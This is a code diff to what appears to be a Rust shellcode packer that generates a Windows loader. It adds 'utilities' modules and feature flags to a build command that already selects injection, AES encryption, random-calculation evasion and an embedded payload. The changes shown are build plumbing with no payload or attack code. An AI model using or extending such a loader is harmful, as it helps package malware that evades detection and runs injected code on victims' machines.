@@ -34,6 +34,16 @@ pub const TEMPLATE_MODULES: &[TemplateModule] = &[
         dest_file: "./loader/src/execution/injection.rs",
     },
     TemplateModule {
+        name: "utilities_mod",
+        source_file: "./template/utilities/mod.rs",
+        dest_file: "./loader/src/utilities/mod.rs",
+    },
+    TemplateModule {
+        name: "utilities_utils",
+        source_file: "./template/utilities/utils.rs",
+        dest_file: "./loader/src/utilities/utils.rs",
+    },
+    TemplateModule {
         name: "aes",
         source_file: "./template/aes/aes.rs",
         dest_file: "./loader/src/aes.rs",
@@ -72,7 +82,7 @@ pub const ADDITIONAL_FILES: &[AdditionalFile] = &[
 ];
 
 pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) -> String {
-    let mut compile_command = " build --release ".to_string();
+    let mut compile_command = "build --release ".to_string();
     
     if config.random_calculation {
         compile_command.push_str("--features calculation ");
@@ -84,12 +94,17 @@ pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) 
         compile_command.push_str(&format!("--features {} ", config.injection_method.feature_name()));
     }
     
+    // Add utility features
+    for utility in &config.utils {
+        compile_command.push_str(&format!("--features {} ", utility.feature_name()));
+    }
+    
     if let Some(encryption) = config.encrypt {
         compile_command.push_str(&format!("--features {} ", encryption.feature_name()));
     }
     
     compile_command.push_str("--features embedded ");
-    compile_command.push_str(" --manifest-path ./loader/Cargo.toml");
+    compile_command.push_str("--manifest-path ./loader/Cargo.toml");
     compile_command.push_str(" --target x86_64-pc-windows-msvc");
     
     compile_command
@@ -106,6 +121,7 @@ pub fn setup_loader_directory() -> Result<(), std::io::Error> {
     std::fs::create_dir_all("loader")?;
     std::fs::create_dir_all("loader/src")?;
     std::fs::create_dir_all("loader/src/execution")?;
+    std::fs::create_dir_all("loader/src/utilities")?;
     
     // Copy Cargo.toml from template to loader directory
     let template_cargo = "template/Cargo.toml";
@@ -134,6 +150,7 @@ fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
     match module_name {
         "execution_mod" | "execution_execution" | "execution_injection" => true,
         "aes" => config.encrypt.is_some(),
+        "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
         _ => false,
     }
 }
@@ -166,6 +183,11 @@ pub fn display_feature_summary(config: &PackerConfig) {
     
     if config.random_calculation {
         features.push("Random Calculation");
+    }
+    
+    // Add utility features first (they run before execution)
+    for utility in &config.utils {
+        features.push(utility.display_name());
     }
     
     features.push(config.execution_shellcode.display_name());
